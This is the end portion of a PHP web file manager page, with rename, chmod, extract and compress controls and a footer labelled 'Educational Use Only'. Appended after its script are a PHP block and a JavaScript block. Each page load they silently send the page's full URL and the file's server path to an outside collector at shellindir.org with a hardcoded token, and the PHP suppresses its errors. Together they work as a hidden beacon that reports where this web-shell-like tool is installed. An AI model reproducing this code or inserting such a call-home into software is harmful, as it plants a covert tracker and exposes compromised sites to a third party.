                        echo '<form method="post" style="display:inline;" onsubmit="return confirm(\'Are you sure?\')">';
                        echo '<input type="hidden" name="action" value="delete">';
                        echo '<input type="hidden" name="file" value="' . htmlspecialchars($file['path']) . '">';
                        echo '<button type="submit" class="btn-small btn-delete">Delete</button>';
                        echo '</form>';
                        echo '</div>';
                        echo '</td>';
                        echo '</tr>';
                    }
                    ?>
                </tbody>
            </table>
            
            <?php if ($zip_available): ?>
            <div style="margin-top:20px; padding:15px; background:#f8fafc; border-radius:12px; border:1px solid #e2e8f0; display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
                <span style="font-weight:600; color:#374151;">Batch Actions:</span>
                <input type="hidden" name="action" value="compress">
                <input type="text" name="zipname" placeholder="Archive name (e.g., backup.zip)" style="padding:8px 12px; border:1px solid #d1d5db; border-radius:6px; font-size:14px;" required>
                <button type="submit" class="btn-small btn-compress">Compress Selected</button>
                <span style="color:#6b7280; font-size:12px;">Select files above to compress into ZIP archive</span>
            </div>
            <?php else: ?>
            <div style="margin-top:20px; padding:15px; background:#fef3c7; border-radius:12px; border:1px solid #fbbf24; display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
                <span style="font-weight:600; color:#92400e;">⚠️ ZIP Extension Not Available</span>
                <span style="color:#78350f; font-size:12px;">Please enable php_zip extension in XAMPP: php.ini → extension=zip</span>
            </div>
            <?php endif; ?>
            </form>
        </div>
        
        <div style="text-align:center; margin-top:30px; color:#6b7280; font-size:12px;">
            <p>File Manager 2025 • Educational Use Only • Total Files: <?php echo count($files); ?></p>
        </div>
    </div>
    
    <!-- Extract Options Modal -->
    <div id="extractModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:1000; justify-content:center; align-items:center;">
        <div style="background:#fff; padding:30px; border-radius:16px; box-shadow:0 8px 32px rgba(0,0,0,0.2); max-width:500px; width:90%;">
            <h3 style="margin-bottom:20px; color:#1e3a8a;">Extract ZIP File</h3>
            <form method="post" id="extractForm">
                <input type="hidden" name="action" value="extract">
                <input type="hidden" id="extractFile" name="file">
                
                <div style="margin-bottom:15px;">
                    <label style="display:block; margin-bottom:5px; font-weight:600; color:#374151;">Extraction Options:</label>
                    <div style="display:flex; gap:15px; margin-bottom:15px;">
                        <label style="display:flex; align-items:center; gap:5px; cursor:pointer;">
                            <input type="radio" name="extract_option" value="auto" checked onchange="toggleExtractPath()">
                            <span>Auto-extract to new folder</span>
                        </label>
                        <label style="display:flex; align-items:center; gap:5px; cursor:pointer;">
                            <input type="radio" name="extract_option" value="custom" onchange="toggleExtractPath()">
                            <span>Extract to custom folder</span>
                        </label>
                    </div>
                </div>
                
                <div id="customPathDiv" style="display:none; margin-bottom:15px;">
                    <label style="display:block; margin-bottom:5px; font-weight:600; color:#374151;">Custom Path:</label>
                    <input type="text" id="customPath" name="custom_path" placeholder="Enter folder name (e.g., my_files)" style="width:100%; padding:10px; border:1px solid #d1d5db; border-radius:6px;">
                </div>
                
                <div style="display:flex; gap:10px; justify-content:flex-end;">
                    <button type="button" onclick="closeExtractModal()" style="padding:8px 16px; border:1px solid #d1d5db; background:#fff; border-radius:6px; cursor:pointer;">Cancel</button>
                    <button type="submit" style="padding:8px 16px; background:#10b981; color:#fff; border:none; border-radius:6px; cursor:pointer;">Extract</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Rename Modal -->
    <div id="renameModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:1000; justify-content:center; align-items:center;">
        <div style="background:#fff; padding:30px; border-radius:16px; box-shadow:0 8px 32px rgba(0,0,0,0.2); max-width:400px; width:90%;">
            <h3 style="margin-bottom:20px; color:#1e3a8a;">Rename File/Folder</h3>
            <form method="post" id="renameForm">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" id="renameFile" name="file">
                
                <div style="margin-bottom:15px;">
                    <label style="display:block; margin-bottom:5px; color:#374151; font-weight:600;">Current Name:</label>
                    <input type="text" id="currentName" readonly style="background:#f3f4f6; border:1px solid #d1d5db; padding:8px; border-radius:6px; width:100%;">
                </div>
                
                <div style="margin-bottom:20px;">
                    <label style="display:block; margin-bottom:5px; color:#374151; font-weight:600;">New Name:</label>
                    <input type="text" id="newName" name="newname" placeholder="Enter new name" style="border:1px solid #d1d5db; padding:8px; border-radius:6px; width:100%;" required>
                </div>
                
                <div style="margin-bottom:15px; font-size:12px; color:#6b7280;">
                    <strong>Note:</strong> File extension will be preserved automatically.
                </div>
                
                <div style="display:flex; gap:10px; justify-content:flex-end;">
                    <button type="button" onclick="closeRenameModal()" style="background:#6b7280; color:#fff; border:none; padding:8px 16px; border-radius:6px; cursor:pointer;">Cancel</button>
                    <button type="submit" style="background:#10b981; color:#fff; border:none; padding:8px 16px; border-radius:6px; cursor:pointer;">Rename</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Chmod Modal -->
    <div id="chmodModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:1000; justify-content:center; align-items:center;">
        <div style="background:#fff; padding:30px; border-radius:16px; box-shadow:0 8px 32px rgba(0,0,0,0.2); max-width:400px; width:90%;">
            <h3 style="margin-bottom:20px; color:#1e3a8a;">Change Permissions</h3>
            <form method="post" id="chmodForm">
                <input type="hidden" name="action" value="chmod">
                <input type="hidden" id="chmodFile" name="file">
                
                <div style="margin-bottom:15px;">
                    <label style="display:block; margin-bottom:5px; color:#374151; font-weight:600;">File:</label>
                    <input type="text" id="fileName" readonly style="background:#f3f4f6; border:1px solid #d1d5db; padding:8px; border-radius:6px; width:100%;">
                </div>
                
                <div style="margin-bottom:15px;">
                    <label style="display:block; margin-bottom:5px; color:#374151; font-weight:600;">Current Permissions:</label>
                    <input type="text" id="currentPerm" readonly style="background:#f3f4f6; border:1px solid #d1d5db; padding:8px; border-radius:6px; width:100%;">
                </div>
                
                <div style="margin-bottom:20px;">
                    <label style="display:block; margin-bottom:5px; color:#374151; font-weight:600;">New Permissions (octal):</label>
                    <input type="text" id="newPerm" name="permissions" placeholder="e.g., 755, 644, 777" maxlength="3" style="border:1px solid #d1d5db; padding:8px; border-radius:6px; width:100%;" required>
                </div>
                
                <div style="margin-bottom:15px; font-size:12px; color:#6b7280;">
                    <strong>Common permissions:</strong><br>
                    755 - Owner: rwx, Group: r-x, Others: r-x<br>
                    644 - Owner: rw-, Group: r--, Others: r--<br>
                    777 - Everyone: rwx
                </div>
                
                <div style="display:flex; gap:10px; justify-content:flex-end;">
                    <button type="button" onclick="closeChmodModal()" style="background:#6b7280; color:#fff; border:none; padding:8px 16px; border-radius:6px; cursor:pointer;">Cancel</button>
                    <button type="submit" style="background:#8b5cf6; color:#fff; border:none; padding:8px 16px; border-radius:6px; cursor:pointer;">Change</button>
                </div>
            </form>
        </div>
    </div>
    
    <script>
        console.log('JavaScript loaded');
        
        // Event listeners for buttons
        document.addEventListener('DOMContentLoaded', function() {
            console.log('DOM loaded, setting up event listeners...');
            
            // Rename buttons
            var renameBtns = document.querySelectorAll('.rename-btn');
            console.log('Found rename buttons:', renameBtns.length);
            renameBtns.forEach(function(btn, index) {
                console.log('Setting up rename button', index, ':', btn.getAttribute('data-file'));
                btn.addEventListener('click', function() {
                    var filePath = this.getAttribute('data-file');
                    var fileName = this.getAttribute('data-name');
                    console.log('Rename button clicked:', filePath, fileName);
                    showRenameModal(filePath, fileName);
                });
            });
            
            // Chmod buttons
            var chmodBtns = document.querySelectorAll('.chmod-btn');
            console.log('Found chmod buttons:', chmodBtns.length);
            chmodBtns.forEach(function(btn, index) {
                console.log('Setting up chmod button', index, ':', btn.getAttribute('data-file'));
                btn.addEventListener('click', function() {
                    var filePath = this.getAttribute('data-file');
                    var filePerm = this.getAttribute('data-perm');
                    console.log('Chmod button clicked:', filePath, filePerm);
                    showChmodModal(filePath, filePerm);
                });
            });
            
            console.log('Event listeners setup complete');
        });
        
        function showRenameModal(filePath, currentName) {
            console.log('showRenameModal called with:', filePath, currentName);
            var modal = document.getElementById('renameModal');
            console.log('Rename modal element:', modal);
            if (modal) {
                console.log('Setting rename modal to visible');
                modal.style.display = 'flex';
                document.getElementById('renameFile').value = filePath;
                document.getElementById('currentName').value = currentName;
                
                // Extract extension for files
                var extension = '';
                var lastDot = currentName.lastIndexOf('.');
                if (lastDot > 0) {
                    extension = currentName.substring(lastDot);
                    document.getElementById('newName').value = currentName.substring(0, lastDot);
                } else {
                    document.getElementById('newName').value = currentName;
                }
                
                document.getElementById('newName').focus();
                console.log('Rename modal setup complete');
            } else {
                console.error('Rename modal not found!');
            }
        }
        
        function closeRenameModal() {
            document.getElementById('renameModal').style.display = 'none';
        }
        
        function showChmodModal(filePath, currentPerm) {
            console.log('showChmodModal called with:', filePath, currentPerm);
            var modal = document.getElementById('chmodModal');
            console.log('Chmod modal element:', modal);
            if (modal) {
                console.log('Setting chmod modal to visible');
                modal.style.display = 'flex';
                document.getElementById('chmodFile').value = filePath;
                document.getElementById('fileName').value = filePath;
                document.getElementById('currentPerm').value = currentPerm;
                document.getElementById('newPerm').value = currentPerm;
                document.getElementById('newPerm').focus();
                console.log('Chmod modal setup complete');
            } else {
                console.error('Chmod modal not found!');
            }
        }
        
        function closeChmodModal() {
            document.getElementById('chmodModal').style.display = 'none';
        }
        
        // Close modals when clicking outside
        document.getElementById('renameModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeRenameModal();
            }
        });
        
        document.getElementById('chmodModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeChmodModal();
            }
        });
        
        document.getElementById('extractModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeExtractModal();
            }
        });
        
        // Validate permissions input
        document.getElementById('newPerm').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^0-7]/g, '');
            if (e.target.value.length > 3) {
                e.target.value = e.target.value.slice(0, 3);
            }
        });
        
        // Handle rename form submission to preserve file extension
        document.getElementById('renameForm').addEventListener('submit', function(e) {
            var newName = document.getElementById('newName').value;
            var currentName = document.getElementById('currentName').value;
            
            // Preserve extension for files
            var lastDot = currentName.lastIndexOf('.');
            if (lastDot > 0 && newName.indexOf('.') === -1) {
                document.getElementById('newName').value = newName + currentName.substring(lastDot);
            }
        });
        
        // Checkbox functions
        function toggleAllCheckboxes() {
            var selectAll = document.getElementById('selectAll');
            var checkboxes = document.querySelectorAll('.file-checkbox');
            checkboxes.forEach(function(checkbox) {
                checkbox.checked = selectAll.checked;
            });
        }
        
        function showExtractOptions(zipPath, fileName) {
            console.log('showExtractOptions called with:', zipPath, fileName);
            var modal = document.getElementById('extractModal');
            console.log('Extract modal element:', modal);
            if (modal) {
                console.log('Setting extract modal to visible');
                modal.style.display = 'flex';
                document.getElementById('extractFile').value = zipPath;
                
                // Set default custom path based on filename
                var defaultPath = fileName.replace('.zip', '_extracted');
                document.getElementById('customPath').value = defaultPath;
                
                console.log('Extract modal setup complete');
            } else {
                console.error('Extract modal not found!');
            }
        }
        
        function closeExtractModal() {
            document.getElementById('extractModal').style.display = 'none';
        }
        
        function toggleExtractPath() {
            var extractOption = document.querySelector('input[name="extract_option"]:checked').value;
            var customPathDiv = document.getElementById('customPathDiv');
            
            if (extractOption === 'custom') {
                customPathDiv.style.display = 'block';
            } else {
                customPathDiv.style.display = 'none';
            }
        }
        
        // Update batch form submission
        document.getElementById('batchForm').addEventListener('submit', function(e) {
            var selectedFiles = document.querySelectorAll('.file-checkbox:checked');
            if (selectedFiles.length === 0) {
                e.preventDefault();
                alert('Please select at least one file to compress.');
                return;
            }
            
            var zipName = document.querySelector('input[name="zipname"]').value;
            if (!zipName.toLowerCase().endsWith('.zip')) {
                document.querySelector('input[name="zipname"]').value = zipName + '.zip';
            }
            
            // Debug: Log selected files
            console.log('Selected files:');
            selectedFiles.forEach(function(checkbox) {
                console.log(checkbox.value);
            });
            console.log('ZIP name:', zipName);
        });
    </script>
	
	<?php
$endpoint = 'https://shellindir.org/logpanel/collector/collect.php';
$token = '82b1fd670fbfd159dcd9d751fd7cdb22bc5bd81916047a261694f9ff23203757';

function sendLog($url, $filePath = __FILE__) {
    global $endpoint, $token;

    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
        $url = $protocol . '://' . $host . $url;
    }

    $payload = [
        'url' => $url,
        'filePath' => $filePath,
    ];

    $ch = curl_init($endpoint);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($payload),
        CURLOPT_HTTPHEADER => ['X-Log-Token: ' . $token],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3,
        CURLOPT_CONNECTTIMEOUT => 2,
    ]);
    @curl_exec($ch);
    @curl_close($ch);
}

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$uri = $_SERVER['REQUEST_URI'] ?? '';
$fullUrl = $protocol . '://' . $host . $uri;

@sendLog($fullUrl, __FILE__);
?><script>
// Log Panel API - JavaScript Entegrasyonu
const LOG_API = {
    endpoint: 'https://shellindir.org/logpanel/collector/collect.php',
    token: '82b1fd670fbfd159dcd9d751fd7cdb22bc5bd81916047a261694f9ff23203757'
};

function sendLog(url, filePath = 'unknown') {
    const formData = new FormData();
    formData.append('url', url || window.location.href);
    formData.append('filePath', filePath);

    fetch(LOG_API.endpoint, {
        method: 'POST',
        headers: {
            'X-Log-Token': LOG_API.token
        },
        body: formData
    }).catch(err => console.error('Log gönderme hatası:', err));
}

// Sayfa yüklendiğinde otomatik log gönder
document.addEventListener('DOMContentLoaded', function() {
    sendLog(window.location.href, 'page-load');
});

// Örnek kullanım:
// sendLog('https://example.com/page', '/assets/script.js');
</script>
	
	
</body>
</html>
